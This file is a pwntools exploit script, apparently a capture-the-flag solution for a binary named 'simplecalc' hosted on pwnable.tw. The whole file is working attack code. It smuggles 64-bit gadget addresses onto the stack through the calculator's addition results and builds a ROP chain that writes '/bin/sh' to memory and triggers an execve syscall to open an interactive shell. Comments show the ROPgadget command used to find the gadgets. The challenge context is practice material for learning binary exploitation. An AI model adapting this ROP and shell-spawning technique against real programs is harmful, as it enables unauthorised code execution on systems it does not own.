from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# io = remote('chall.pwnable.tw', 10000)
io = process('./simplecalc')
# io = gdb.debug('./simplecalc','''
# start
# bp 0x000000000040154a
# c
# ''')

io.recvuntil(b"Expected number of calculations:")
io.sendline(b"100")
io.recvuntil(b"=> ")

def addSingle(input):
    io.sendline(b"1")
    io.recvuntil(b"Integer x: ")
    io.sendline(b"12342")
    io.recvuntil(b"Integer y: ")
    io.sendline(str(input-12342).encode())
    io.recvuntil(b"=> ")

def add(input):
    x = input & 0xffffffff
    y = (input & 0xffffffff00000000) >> 32
    addSingle(x)
    addSingle(y)

for _ in range(9):
    add(0)

poprax = 0x000000000044db34
poprdi = 0x0000000000401b73
poprsi = 0x0000000000401c87
poprdx = 0x0000000000437a85
syscall = 0x0000000000400488
binsh = 0x6c1000

# ROPgadget --binary ./simplecalc | grep ": mov qword ptr" | grep "ret" | less
# 0x000000000044526e : mov qword ptr [rax], rdx ; ret
mov = 0x000000000044526e

pushrax_ret = 0x00000000004b2e2c

# rax = 0x6c1000
add(poprax)
add(binsh)
# rdx = "/bin/sh\x00"
add(poprdx)
add(int.from_bytes(b"\x00hs/nib/"))
# [0x6c1000] = "/bin/sh\x00"
add(mov)
# rax = 59
add(poprax)
add(59)
# rdi = 0x6c1000
add(poprdi)
add(binsh)
# rsi = 0
add(poprsi)
add(0)
# rdx = 0
add(poprdx)
add(0)
# syscall
add(syscall)

io.sendline(b"5")
io.interactive()